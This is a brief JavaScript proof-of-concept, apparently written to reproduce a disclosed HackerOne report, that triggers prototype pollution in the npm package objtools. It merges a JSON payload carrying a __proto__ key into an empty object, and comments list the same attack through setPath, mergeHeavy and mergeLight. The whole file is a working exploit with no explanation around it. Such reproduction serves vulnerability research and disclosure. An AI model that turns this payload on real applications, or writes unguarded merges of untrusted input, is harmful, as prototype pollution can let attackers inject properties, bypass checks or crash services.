//https://hackerone.com/reports/878394
const objtools = require('objtools');
const payload = JSON.parse('{"__proto__":{"polluted":"yes"}}');
obj = {}

objtools.merge({}, payload);

// objtools.setPath({}, "__proto__.polluted", "yes")
// objtools.mergeHeavy({}, payload)
// objtools.mergeLight({}, payload)
    
  